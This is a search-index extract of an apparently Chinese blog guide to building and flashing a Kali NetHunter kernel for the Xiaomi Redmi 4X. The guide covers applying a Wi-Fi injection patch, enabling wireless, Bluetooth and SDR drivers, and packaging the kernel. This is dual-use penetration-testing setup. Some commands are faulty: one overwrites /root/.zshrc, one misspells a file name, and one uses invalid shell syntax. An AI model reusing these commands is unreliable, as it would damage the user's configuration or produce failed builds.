\"Generic IEEE 802.11 Networking Stack (mac80211)\" \"Enable mac80211 mesh networking (pre-802.11s) support\" 然后返回上一级菜单 如图所示 wireless 接着进入到\"Device Drivers\" -\u003e \"Network device support\" -\u003e \"USB Network Adapters\" 勾选以下几个选项： \"USB RTL8150 based ethernet device support\" \"Realtek RTL8152/RTL8153 Based USB Ethernet Adapters\" \"ASIX AX88xxx Based USB 2.0 Ethernet Adapters\" \"ASIX AX88179/178A USB 3.0/2.0 to Gigabit Ethernet\". 然后返回上一级菜单 如图所示 usb_net 接着进入到\"Wireless LAN\" 勾选以下几个选项： \"Atheros/Qualcomm devices\" \"Atheros HTC based wireless cards support\" \"Linux Community AR9170 802.11n USB support\" \"Atheros mobile chipsets support\" \"Atheros ath6kl USB support\" \"MediaTek devices\" \"MediaTek MT7601U (USB) support\" \"Ralink devices\" \"Ralink driver support\" \"Realtek devices\" \"Realtek 8187 and 8187B USB support\" \"Realtek rtlwifi family of devices\" \"RTL8723AU/RTL8188[CR]U/RTL819[12]CU (mac80211) support\" \"Include support for untested Realtek 8xxx USB devices (EXPERIMENTAL)\" \"ZyDAS devices\" \"USB ZD1201 based Wireless device support\" \"ZyDAS ZD1211/ZD1211B USB-wireless support\" \"Wireless RNDIS USB support\" 在\"Ralink driver support\"中勾选以下几个选项： \"Ralink rt2500 (USB) support\" \"Ralink rt2501/rt73 (USB) support\" \"Ralink rt27xx/rt28xx/rt30xx (USB) support\" \"rt2800usb - Include support for rt33xx devices\" \"rt2800usb - Include support for rt35xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt3573 devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt53xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt55xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for unknown (USB) devices\" 在\"Realtek rtlwifi family of devices\" 中勾选 \"Realtek RTL8192CU/RTL8188CU USB Wireless Network Adapter\" 然后返回主菜单 如图所示 Atheros MediaTek Ralink Realtek ZyDAS 进入到\"Device Drivers\" -\u003e \"Multimedia support\" 勾选： \"Digital TV support\" \"Software defined radio support\" \"Media USB Adapters\" 在\"Media USB Adapters\"中 勾选： \"Airspy\" \"HackRF\" \"Mirics MSi 2500\" 然后拉到最下面，取消勾选 \"Autoselect ancillary drivers (tuners, sen","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:7:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#图形化配置内核选项"},{"categories":["kali"],"content":" 7 0x06 编译内核 7.0.8 设置环境变量 export ARCH=arm64 export SUBARCH=arm64 export KBUILD_BUILD_HOST=kali export KBUILD_BUILD_USER=root export LOCALVERSION=-NetHunter export PATH=\"/root/proton-clang/bin:$PATH\" mkdir out args=\"-j$(nproc --all) \\ ARCH=arm64 \\ SUBARCH=arm64 \\ O=out \\ CC=clang \\ CROSS_COMPILE=aarch64-linux-gnu- \\ CROSS_COMPILE_ARM32=arm-linux-gnueabi- \\ CLANG_TRIPLE=aarch64-linux-gnu- \\ AR=llvm-ar \\ NM=llvm-nm \\ OBJCOPY=llvm-objcopy \\ OBJDUMP=llvm-objdump \\ STRIP=llvm-strip \" 7.0.9 打入补丁这里根据你的内核版本选择对应内核版本的补丁(patches) 我这里内核是4.9所以选择4.9内核的补丁 git clone https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-kernel.git patch -p1 \u003c kali-nethunter-kernel/patches/4.09/add-wifi-injection-4.14.patch patch -p1 \u003c kali-nethunter-kernel/patches/4.09/fix-ath9k-naming-conflict.patch 7.0.10 生成defconfig make ${args} mrproper make ${args} santoni_treble_defconfig 7.0.11 图形化配置内核选项以下内容不同版本内核可能会有所不同，以实际情况为准！ make ${args} menuconfig menuconfig 首先进入\"Gerenal Setup\" 选择到\"Local version - append to kernel release\" 清空里面所有内容 然后取消勾选\"Automatically append version information to the version string\" 接着选中\"Default hostname\"，输入\"kali\" 接着勾选\"System V IPC\" 然后返回上一级菜单 如图所示 general 接着进入到\"Enable loadable module support\" 勾选以下几个选项: \"loadable module support\" \"Forced module loading\" \"Modules unloading\" \"Forced module unloading\" \"Module versioning support\" 然后返回上一级菜单 如图所示 module 接着进入到\"Networking support\" -\u003e \"Bluetooth subsystem support\" -\u003e \"Bluetooth drivers support\" 勾选以下几个选项: \"HCI USB driver\" \"Broadcom protocol support\" \"Realtek protocol support\" \"HCI UART driver\" \"HCI BCM203x USB driver\" \"HCI BPA10x USB driver\" \"HCI BlueFRITZ! USB driver\" 然后返回上一级菜单 如图所示 bluetooth-driver 勾选以下几个选项： \"Bluetooth Classic (BR/EDR) features\" \"RFCOMM protocol support\" \"RFCOMM TTY support\" \"BNEP protocol support\" \"HIDP protocol support\" \"Bluetooth Low Energy (LE) features\" 然后返回上一级菜单 如图所示 bluetooth 进入到\"Wireless\" 勾选以下几个选项： \"nl80211 testmode command\" \"use statically compiled regulatory rules database\" \"cfg80211 wireless extensions compatibility\" \"Generic IEEE 802.11 Networking Stack (mac80211)\" \"Enable mac80211 mesh networking (pre-802.11s) support\" 然后返回上一级菜单 如图所示 wireless 接着进入到\"Device Drivers\" -\u003e \"Network device support\" -\u003e \"USB Network Adapters\" 勾选以下几个选项： \"USB RTL8150 based ethernet device support\" \"Realtek RTL8152/RTL8153 Based USB Ethernet Adapters\" \"ASIX AX88xxx Based USB 2.0 Ethernet Adapters\" \"ASIX AX88179/178A USB 3.0/2.0 to Gigabit Ethernet\". 然后返回上一级菜单 如图所示 usb_net 接着进入到\"Wireless LAN\" 勾选以下几个选项： \"Atheros/Qualcomm devices\" \"Atheros HTC based wireless cards support\" \"Linux Community AR9170 802.11n USB support\" \"Atheros mobile chipsets support\" \"Atheros ath6kl USB support\" \"MediaTek devices\" \"MediaTek MT7601U (USB) support\" \"Ralink devices\" \"Ralink driver support\" \"Realtek devices\" \"Realtek 8187 and 8187B USB support\" \"Realtek rtlwifi family of devices\" \"RTL8723AU/RTL8188[CR]U/RTL819[12]CU (mac80211) support\" \"Include support for untested Realtek 8xxx USB devices (EXPERIMENTAL)\" \"ZyDAS devices\" \"USB ZD1201 based Wireless device support\" \"ZyDAS ZD1211/ZD1211B USB-wireless support\" \"Wireless RNDIS USB support\" 在\"Ralink driver support\"中勾选以下几个选项： \"Ralink rt2500 (USB) support\" \"Ralink rt2501/rt73 (USB) support\" \"Ralink rt27xx/rt28xx/rt30xx (USB) support\" \"rt2800usb - Include support for rt33xx devices\" \"rt2800usb - Include support for rt35xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt3573 devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt53xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt55xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for unknown (USB) devices\" 在\"Realtek rtlwifi family of devices\" 中勾选 \"Realtek RTL8192CU/RTL8188CU USB Wireless Network Adapter\" 然后返回主菜单 如图所示 Atheros MediaTek Ralink Realtek ZyDAS 进入到\"Device Drivers\" -\u003e \"Multimedia support\" 勾选： \"Digital TV support\" \"Software defined radio support\" \"Media USB Adapters\" 在\"Media USB Adapters\"中 勾选： \"Airspy\" \"HackRF\" \"Mirics MSi 2500\" 然后拉到最下面，取消勾选 \"Autoselect ancillary drivers (tuners, sen","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:7:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#保存配置"},{"categories":["kali"],"content":" 7 0x06 编译内核 7.0.8 设置环境变量 export ARCH=arm64 export SUBARCH=arm64 export KBUILD_BUILD_HOST=kali export KBUILD_BUILD_USER=root export LOCALVERSION=-NetHunter export PATH=\"/root/proton-clang/bin:$PATH\" mkdir out args=\"-j$(nproc --all) \\ ARCH=arm64 \\ SUBARCH=arm64 \\ O=out \\ CC=clang \\ CROSS_COMPILE=aarch64-linux-gnu- \\ CROSS_COMPILE_ARM32=arm-linux-gnueabi- \\ CLANG_TRIPLE=aarch64-linux-gnu- \\ AR=llvm-ar \\ NM=llvm-nm \\ OBJCOPY=llvm-objcopy \\ OBJDUMP=llvm-objdump \\ STRIP=llvm-strip \" 7.0.9 打入补丁这里根据你的内核版本选择对应内核版本的补丁(patches) 我这里内核是4.9所以选择4.9内核的补丁 git clone https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-kernel.git patch -p1 \u003c kali-nethunter-kernel/patches/4.09/add-wifi-injection-4.14.patch patch -p1 \u003c kali-nethunter-kernel/patches/4.09/fix-ath9k-naming-conflict.patch 7.0.10 生成defconfig make ${args} mrproper make ${args} santoni_treble_defconfig 7.0.11 图形化配置内核选项以下内容不同版本内核可能会有所不同，以实际情况为准！ make ${args} menuconfig menuconfig 首先进入\"Gerenal Setup\" 选择到\"Local version - append to kernel release\" 清空里面所有内容 然后取消勾选\"Automatically append version information to the version string\" 接着选中\"Default hostname\"，输入\"kali\" 接着勾选\"System V IPC\" 然后返回上一级菜单 如图所示 general 接着进入到\"Enable loadable module support\" 勾选以下几个选项: \"loadable module support\" \"Forced module loading\" \"Modules unloading\" \"Forced module unloading\" \"Module versioning support\" 然后返回上一级菜单 如图所示 module 接着进入到\"Networking support\" -\u003e \"Bluetooth subsystem support\" -\u003e \"Bluetooth drivers support\" 勾选以下几个选项: \"HCI USB driver\" \"Broadcom protocol support\" \"Realtek protocol support\" \"HCI UART driver\" \"HCI BCM203x USB driver\" \"HCI BPA10x USB driver\" \"HCI BlueFRITZ! USB driver\" 然后返回上一级菜单 如图所示 bluetooth-driver 勾选以下几个选项： \"Bluetooth Classic (BR/EDR) features\" \"RFCOMM protocol support\" \"RFCOMM TTY support\" \"BNEP protocol support\" \"HIDP protocol support\" \"Bluetooth Low Energy (LE) features\" 然后返回上一级菜单 如图所示 bluetooth 进入到\"Wireless\" 勾选以下几个选项： \"nl80211 testmode command\" \"use statically compiled regulatory rules database\" \"cfg80211 wireless extensions compatibility\" \"Generic IEEE 802.11 Networking Stack (mac80211)\" \"Enable mac80211 mesh networking (pre-802.11s) support\" 然后返回上一级菜单 如图所示 wireless 接着进入到\"Device Drivers\" -\u003e \"Network device support\" -\u003e \"USB Network Adapters\" 勾选以下几个选项： \"USB RTL8150 based ethernet device support\" \"Realtek RTL8152/RTL8153 Based USB Ethernet Adapters\" \"ASIX AX88xxx Based USB 2.0 Ethernet Adapters\" \"ASIX AX88179/178A USB 3.0/2.0 to Gigabit Ethernet\". 然后返回上一级菜单 如图所示 usb_net 接着进入到\"Wireless LAN\" 勾选以下几个选项： \"Atheros/Qualcomm devices\" \"Atheros HTC based wireless cards support\" \"Linux Community AR9170 802.11n USB support\" \"Atheros mobile chipsets support\" \"Atheros ath6kl USB support\" \"MediaTek devices\" \"MediaTek MT7601U (USB) support\" \"Ralink devices\" \"Ralink driver support\" \"Realtek devices\" \"Realtek 8187 and 8187B USB support\" \"Realtek rtlwifi family of devices\" \"RTL8723AU/RTL8188[CR]U/RTL819[12]CU (mac80211) support\" \"Include support for untested Realtek 8xxx USB devices (EXPERIMENTAL)\" \"ZyDAS devices\" \"USB ZD1201 based Wireless device support\" \"ZyDAS ZD1211/ZD1211B USB-wireless support\" \"Wireless RNDIS USB support\" 在\"Ralink driver support\"中勾选以下几个选项： \"Ralink rt2500 (USB) support\" \"Ralink rt2501/rt73 (USB) support\" \"Ralink rt27xx/rt28xx/rt30xx (USB) support\" \"rt2800usb - Include support for rt33xx devices\" \"rt2800usb - Include support for rt35xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt3573 devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt53xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt55xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for unknown (USB) devices\" 在\"Realtek rtlwifi family of devices\" 中勾选 \"Realtek RTL8192CU/RTL8188CU USB Wireless Network Adapter\" 然后返回主菜单 如图所示 Atheros MediaTek Ralink Realtek ZyDAS 进入到\"Device Drivers\" -\u003e \"Multimedia support\" 勾选： \"Digital TV support\" \"Software defined radio support\" \"Media USB Adapters\" 在\"Media USB Adapters\"中 勾选： \"Airspy\" \"HackRF\" \"Mirics MSi 2500\" 然后拉到最下面，取消勾选 \"Autoselect ancillary drivers (tuners, sen","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:7:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#编译内核"},{"categories":["kali"],"content":" 7 0x06 编译内核 7.0.8 设置环境变量 export ARCH=arm64 export SUBARCH=arm64 export KBUILD_BUILD_HOST=kali export KBUILD_BUILD_USER=root export LOCALVERSION=-NetHunter export PATH=\"/root/proton-clang/bin:$PATH\" mkdir out args=\"-j$(nproc --all) \\ ARCH=arm64 \\ SUBARCH=arm64 \\ O=out \\ CC=clang \\ CROSS_COMPILE=aarch64-linux-gnu- \\ CROSS_COMPILE_ARM32=arm-linux-gnueabi- \\ CLANG_TRIPLE=aarch64-linux-gnu- \\ AR=llvm-ar \\ NM=llvm-nm \\ OBJCOPY=llvm-objcopy \\ OBJDUMP=llvm-objdump \\ STRIP=llvm-strip \" 7.0.9 打入补丁这里根据你的内核版本选择对应内核版本的补丁(patches) 我这里内核是4.9所以选择4.9内核的补丁 git clone https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-kernel.git patch -p1 \u003c kali-nethunter-kernel/patches/4.09/add-wifi-injection-4.14.patch patch -p1 \u003c kali-nethunter-kernel/patches/4.09/fix-ath9k-naming-conflict.patch 7.0.10 生成defconfig make ${args} mrproper make ${args} santoni_treble_defconfig 7.0.11 图形化配置内核选项以下内容不同版本内核可能会有所不同，以实际情况为准！ make ${args} menuconfig menuconfig 首先进入\"Gerenal Setup\" 选择到\"Local version - append to kernel release\" 清空里面所有内容 然后取消勾选\"Automatically append version information to the version string\" 接着选中\"Default hostname\"，输入\"kali\" 接着勾选\"System V IPC\" 然后返回上一级菜单 如图所示 general 接着进入到\"Enable loadable module support\" 勾选以下几个选项: \"loadable module support\" \"Forced module loading\" \"Modules unloading\" \"Forced module unloading\" \"Module versioning support\" 然后返回上一级菜单 如图所示 module 接着进入到\"Networking support\" -\u003e \"Bluetooth subsystem support\" -\u003e \"Bluetooth drivers support\" 勾选以下几个选项: \"HCI USB driver\" \"Broadcom protocol support\" \"Realtek protocol support\" \"HCI UART driver\" \"HCI BCM203x USB driver\" \"HCI BPA10x USB driver\" \"HCI BlueFRITZ! USB driver\" 然后返回上一级菜单 如图所示 bluetooth-driver 勾选以下几个选项： \"Bluetooth Classic (BR/EDR) features\" \"RFCOMM protocol support\" \"RFCOMM TTY support\" \"BNEP protocol support\" \"HIDP protocol support\" \"Bluetooth Low Energy (LE) features\" 然后返回上一级菜单 如图所示 bluetooth 进入到\"Wireless\" 勾选以下几个选项： \"nl80211 testmode command\" \"use statically compiled regulatory rules database\" \"cfg80211 wireless extensions compatibility\" \"Generic IEEE 802.11 Networking Stack (mac80211)\" \"Enable mac80211 mesh networking (pre-802.11s) support\" 然后返回上一级菜单 如图所示 wireless 接着进入到\"Device Drivers\" -\u003e \"Network device support\" -\u003e \"USB Network Adapters\" 勾选以下几个选项： \"USB RTL8150 based ethernet device support\" \"Realtek RTL8152/RTL8153 Based USB Ethernet Adapters\" \"ASIX AX88xxx Based USB 2.0 Ethernet Adapters\" \"ASIX AX88179/178A USB 3.0/2.0 to Gigabit Ethernet\". 然后返回上一级菜单 如图所示 usb_net 接着进入到\"Wireless LAN\" 勾选以下几个选项： \"Atheros/Qualcomm devices\" \"Atheros HTC based wireless cards support\" \"Linux Community AR9170 802.11n USB support\" \"Atheros mobile chipsets support\" \"Atheros ath6kl USB support\" \"MediaTek devices\" \"MediaTek MT7601U (USB) support\" \"Ralink devices\" \"Ralink driver support\" \"Realtek devices\" \"Realtek 8187 and 8187B USB support\" \"Realtek rtlwifi family of devices\" \"RTL8723AU/RTL8188[CR]U/RTL819[12]CU (mac80211) support\" \"Include support for untested Realtek 8xxx USB devices (EXPERIMENTAL)\" \"ZyDAS devices\" \"USB ZD1201 based Wireless device support\" \"ZyDAS ZD1211/ZD1211B USB-wireless support\" \"Wireless RNDIS USB support\" 在\"Ralink driver support\"中勾选以下几个选项： \"Ralink rt2500 (USB) support\" \"Ralink rt2501/rt73 (USB) support\" \"Ralink rt27xx/rt28xx/rt30xx (USB) support\" \"rt2800usb - Include support for rt33xx devices\" \"rt2800usb - Include support for rt35xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt3573 devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt53xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for rt55xx devices (EXPERIMENTAL)\" \"rt2800usb - Include support for unknown (USB) devices\" 在\"Realtek rtlwifi family of devices\" 中勾选 \"Realtek RTL8192CU/RTL8188CU USB Wireless Network Adapter\" 然后返回主菜单 如图所示 Atheros MediaTek Ralink Realtek ZyDAS 进入到\"Device Drivers\" -\u003e \"Multimedia support\" 勾选： \"Digital TV support\" \"Software defined radio support\" \"Media USB Adapters\" 在\"Media USB Adapters\"中 勾选： \"Airspy\" \"HackRF\" \"Mirics MSi 2500\" 然后拉到最下面，取消勾选 \"Autoselect ancillary drivers (tuners, sen","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:7:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#编译内核模块"},{"categories":["kali"],"content":" 8 0x07 构建NetHunter-Kernel-Installer内核包 8.0.15 下载Kali官方构建脚本 git clone https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-project /root/kali-nethunter-project --depth=1 8.0.16 编辑机型列表 mkdir -p /root/kali-nethunter-project/nethunter-installer/devices/ touch /root/kali-nethunter-project/nethunter-installer/devices/devices.cfg vim /root/kali-nethunter-project/nethunter-installer/devices/devices.cfg 按照官方教程，添加以下内容并保存 # Xiaomi Redmi4X for crDroid Android 11 [santoni] author = \"DroidKali\" arch = arm64 version = \"v1.0\" flasher = anykernel modules = 1 slot_device = 0 block = /dev/block/bootdevice/by-name/boot devicenames = santoni,Redmi4x 8.0.17 创建机型对应的文件夹 mkdir -p /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni/modules/system/lib/modules 8.0.18 复制所需要的文件 cp out/arch/arm64/boot/Image.gz-dtb /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni rm -rf out/lib/modules/${make kernelversion}-NetHunter/source rm -rf out/lib/modules/${make kernelversion}-NetHunter/build cp -r out/lib/modules/${make kernelversion}-NetHunter /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni/modules/system/lib/modules/ 8.0.19 生成NetHunter-Kernnel-Installer安装包 cd /root/kali-nethunter-project/nethunter-installer/ python3 build.py -d santoni --eleven --kernel ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:8:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#0x07-构建nethunter-kernel-installer内核包"},{"categories":["kali"],"content":" 8 0x07 构建NetHunter-Kernel-Installer内核包 8.0.15 下载Kali官方构建脚本 git clone https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-project /root/kali-nethunter-project --depth=1 8.0.16 编辑机型列表 mkdir -p /root/kali-nethunter-project/nethunter-installer/devices/ touch /root/kali-nethunter-project/nethunter-installer/devices/devices.cfg vim /root/kali-nethunter-project/nethunter-installer/devices/devices.cfg 按照官方教程，添加以下内容并保存 # Xiaomi Redmi4X for crDroid Android 11 [santoni] author = \"DroidKali\" arch = arm64 version = \"v1.0\" flasher = anykernel modules = 1 slot_device = 0 block = /dev/block/bootdevice/by-name/boot devicenames = santoni,Redmi4x 8.0.17 创建机型对应的文件夹 mkdir -p /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni/modules/system/lib/modules 8.0.18 复制所需要的文件 cp out/arch/arm64/boot/Image.gz-dtb /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni rm -rf out/lib/modules/${make kernelversion}-NetHunter/source rm -rf out/lib/modules/${make kernelversion}-NetHunter/build cp -r out/lib/modules/${make kernelversion}-NetHunter /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni/modules/system/lib/modules/ 8.0.19 生成NetHunter-Kernnel-Installer安装包 cd /root/kali-nethunter-project/nethunter-installer/ python3 build.py -d santoni --eleven --kernel ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:8:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#下载kali官方构建脚本"},{"categories":["kali"],"content":" 8 0x07 构建NetHunter-Kernel-Installer内核包 8.0.15 下载Kali官方构建脚本 git clone https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-project /root/kali-nethunter-project --depth=1 8.0.16 编辑机型列表 mkdir -p /root/kali-nethunter-project/nethunter-installer/devices/ touch /root/kali-nethunter-project/nethunter-installer/devices/devices.cfg vim /root/kali-nethunter-project/nethunter-installer/devices/devices.cfg 按照官方教程，添加以下内容并保存 # Xiaomi Redmi4X for crDroid Android 11 [santoni] author = \"DroidKali\" arch = arm64 version = \"v1.0\" flasher = anykernel modules = 1 slot_device = 0 block = /dev/block/bootdevice/by-name/boot devicenames = santoni,Redmi4x 8.0.17 创建机型对应的文件夹 mkdir -p /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni/modules/system/lib/modules 8.0.18 复制所需要的文件 cp out/arch/arm64/boot/Image.gz-dtb /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni rm -rf out/lib/modules/${make kernelversion}-NetHunter/source rm -rf out/lib/modules/${make kernelversion}-NetHunter/build cp -r out/lib/modules/${make kernelversion}-NetHunter /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni/modules/system/lib/modules/ 8.0.19 生成NetHunter-Kernnel-Installer安装包 cd /root/kali-nethunter-project/nethunter-installer/ python3 build.py -d santoni --eleven --kernel ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:8:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#编辑机型列表"},{"categories":["kali"],"content":" 8 0x07 构建NetHunter-Kernel-Installer内核包 8.0.15 下载Kali官方构建脚本 git clone https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-project /root/kali-nethunter-project --depth=1 8.0.16 编辑机型列表 mkdir -p /root/kali-nethunter-project/nethunter-installer/devices/ touch /root/kali-nethunter-project/nethunter-installer/devices/devices.cfg vim /root/kali-nethunter-project/nethunter-installer/devices/devices.cfg 按照官方教程，添加以下内容并保存 # Xiaomi Redmi4X for crDroid Android 11 [santoni] author = \"DroidKali\" arch = arm64 version = \"v1.0\" flasher = anykernel modules = 1 slot_device = 0 block = /dev/block/bootdevice/by-name/boot devicenames = santoni,Redmi4x 8.0.17 创建机型对应的文件夹 mkdir -p /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni/modules/system/lib/modules 8.0.18 复制所需要的文件 cp out/arch/arm64/boot/Image.gz-dtb /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni rm -rf out/lib/modules/${make kernelversion}-NetHunter/source rm -rf out/lib/modules/${make kernelversion}-NetHunter/build cp -r out/lib/modules/${make kernelversion}-NetHunter /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni/modules/system/lib/modules/ 8.0.19 生成NetHunter-Kernnel-Installer安装包 cd /root/kali-nethunter-project/nethunter-installer/ python3 build.py -d santoni --eleven --kernel ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:8:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#创建机型对应的文件夹"},{"categories":["kali"],"content":" 8 0x07 构建NetHunter-Kernel-Installer内核包 8.0.15 下载Kali官方构建脚本 git clone https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-project /root/kali-nethunter-project --depth=1 8.0.16 编辑机型列表 mkdir -p /root/kali-nethunter-project/nethunter-installer/devices/ touch /root/kali-nethunter-project/nethunter-installer/devices/devices.cfg vim /root/kali-nethunter-project/nethunter-installer/devices/devices.cfg 按照官方教程，添加以下内容并保存 # Xiaomi Redmi4X for crDroid Android 11 [santoni] author = \"DroidKali\" arch = arm64 version = \"v1.0\" flasher = anykernel modules = 1 slot_device = 0 block = /dev/block/bootdevice/by-name/boot devicenames = santoni,Redmi4x 8.0.17 创建机型对应的文件夹 mkdir -p /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni/modules/system/lib/modules 8.0.18 复制所需要的文件 cp out/arch/arm64/boot/Image.gz-dtb /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni rm -rf out/lib/modules/${make kernelversion}-NetHunter/source rm -rf out/lib/modules/${make kernelversion}-NetHunter/build cp -r out/lib/modules/${make kernelversion}-NetHunter /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni/modules/system/lib/modules/ 8.0.19 生成NetHunter-Kernnel-Installer安装包 cd /root/kali-nethunter-project/nethunter-installer/ python3 build.py -d santoni --eleven --kernel ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:8:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#复制所需要的文件"},{"categories":["kali"],"content":" 8 0x07 构建NetHunter-Kernel-Installer内核包 8.0.15 下载Kali官方构建脚本 git clone https://gitlab.com/kalilinux/nethunter/build-scripts/kali-nethunter-project /root/kali-nethunter-project --depth=1 8.0.16 编辑机型列表 mkdir -p /root/kali-nethunter-project/nethunter-installer/devices/ touch /root/kali-nethunter-project/nethunter-installer/devices/devices.cfg vim /root/kali-nethunter-project/nethunter-installer/devices/devices.cfg 按照官方教程，添加以下内容并保存 # Xiaomi Redmi4X for crDroid Android 11 [santoni] author = \"DroidKali\" arch = arm64 version = \"v1.0\" flasher = anykernel modules = 1 slot_device = 0 block = /dev/block/bootdevice/by-name/boot devicenames = santoni,Redmi4x 8.0.17 创建机型对应的文件夹 mkdir -p /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni/modules/system/lib/modules 8.0.18 复制所需要的文件 cp out/arch/arm64/boot/Image.gz-dtb /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni rm -rf out/lib/modules/${make kernelversion}-NetHunter/source rm -rf out/lib/modules/${make kernelversion}-NetHunter/build cp -r out/lib/modules/${make kernelversion}-NetHunter /root/kali-nethunter-project/nethunter-installer/devices/eleven/santoni/modules/system/lib/modules/ 8.0.19 生成NetHunter-Kernnel-Installer安装包 cd /root/kali-nethunter-project/nethunter-installer/ python3 build.py -d santoni --eleven --kernel ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:8:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#生成nethunter-kernnel-installer安装包"},{"categories":["kali"],"content":" 9 0x08 下载ADB-FASTBOOT工具包 wget https://dl.google.com/android/repository/platform-tools-latest-linux.zip unzip paltform-tools-latest-linux.zip -d /usr/share/ echo '''export PATH=\"/usr/share/platform-tools:$PATH\"''' \u003e /root/.zshrc source /root/.zshrc rm -rf platform-tools-latest-linux.zip ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:9:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#0x08-下载adb-fastboot工具包"},{"categories":["kali"],"content":" 10 0x09 刷入内核安装包 10.0.20 重启到Recovery模式 adb reboot recovery 10.0.21 刷入内核刷机包 adb sideload kernel-nethunter-eleven-santoni-20210905_111235.zip ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:10:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#0x09-刷入内核安装包"},{"categories":["kali"],"content":" 10 0x09 刷入内核安装包 10.0.20 重启到Recovery模式 adb reboot recovery 10.0.21 刷入内核刷机包 adb sideload kernel-nethunter-eleven-santoni-20210905_111235.zip ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:10:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#重启到recovery模式"},{"categories":["kali"],"content":" 10 0x09 刷入内核安装包 10.0.20 重启到Recovery模式 adb reboot recovery 10.0.21 刷入内核刷机包 adb sideload kernel-nethunter-eleven-santoni-20210905_111235.zip ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:10:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#刷入内核刷机包"},{"categories":["kali"],"content":" 11 0x10 相关链接Kali NetHunter | Kali Linux Documentation NetHunter gitlab repository “黑客手机\"免费送-知乎专栏 跟我把Kali NetHunter编译至任意手机 